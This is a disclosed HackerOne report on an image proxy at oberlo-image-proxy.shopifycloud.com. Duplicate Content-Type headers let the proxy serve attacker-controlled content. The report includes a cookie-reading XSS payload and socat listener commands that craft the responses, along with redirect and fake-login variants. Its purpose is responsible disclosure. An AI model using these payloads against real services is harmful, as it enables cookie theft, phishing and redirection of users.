---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1267677'
original_report_id: '1267677'
title: Improper Input Validation on https://oberlo-image-proxy.shopifycloud.com/
team_handle: shopify
created_at: '2021-07-19T02:25:28.927Z'
disclosed_at: '2021-08-16T17:20:36.104Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 14
asset_identifier: '*.shopifycloud.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
---

# Improper Input Validation on https://oberlo-image-proxy.shopifycloud.com/

## Metadata

- HackerOne Report ID: 1267677
- Weakness: 
- Program: shopify
- Disclosed At: 2021-08-16T17:20:36.104Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The service under https://oberlo-image-proxy.shopifycloud.com/ seems to work like a image proxy through the url GET parameter and it suppose to handle only images.

█████████

When other content type than an image is present the service returns a 404 error to the user.

```
# curl -si https://oberlo-image-proxy.shopifycloud.com/?url=http://████
HTTP/2 404
date: Mon, 19 Jul 2021 01:57:52 GMT
content-length: 0
x-original-content-length: -1
x-original-status: 200
strict-transport-security: max-age=63072000; includeSubDomains; preload
x-dc: gcp-us-central1
```

By providing two Content-Type (image/png and text/html) response headers in the response an attacker can force the service present any content under his control.
Since two Content-Type response headers are not RFC compliance the response needs to be crafted by a tool like socat or netcat. Let's try XSS!
First create any file with the content below.

```
root@pqp:~/www/shopifycloud# cat xss.jpg
<script>alert(document.cookie)</script>
```

Run socat as a listener with the command below. This command will calculate the size and present the file above with two Content-Type (image/png and text/html) response headers  for any request to my server running under http://pqp.mx.

```
root@pqp:~/www/shopifycloud# FILE=xss.jpg;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c<$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo 'Content-Type: text/html';/bin/echo;dd 2>/dev/null<$FILE"
2021/07/18 22:02:56 socat[3266014] N listening on AF=2 0.0.0.0:80
```

Now loads the URL https://oberlo-image-proxy.shopifycloud.com/?url=http://pqp.mx/xss.jpg in any browser.

██████
{F1381201}

Notice any application with a cookie domain .shopifycloud.com can be impacted. Any attack scenario through XSS is possible here. This can also be useful for CSP bypass when *.shopifycloud.com is whitelisted. Let's try redirect!
The socat command below can be used to redirect to any domain. In this case I'm redirecting the user to https://████.

```
socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Content-Type: image/png";/bin/echo "Content-Type: text/html";/bin/echo "Location: https://███████";/bin/echo;/bin/echo'
```

{F1381208}

Since an attacker can present anything this vulnerability can be used for fake login pages as well. We can use the same approach as the XSS but presenting the file {F1381210}.

```
FILE=login.html;socat -v -d -d TCP-LISTEN:80,fork "SYSTEM:/bin/echo 'HTTP/1.1 200 OK';/bin/echo 'Content-Length: '`wc -c<$FILE`;/bin/echo 'Content-Type: image/png';/bin/echo 'Content-Type: text/html';/bin/echo;dd 2>/dev/null<$FILE"
```

{F1381209}

## Impact

I've presented three different malicious scenarios (XSS, redirect and fake login page) but an attacker can exploit this vulnerability in a lot of different ways.
Most of the time this issue can help in a chain of vulnerabilities in order to produce a critical impact.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
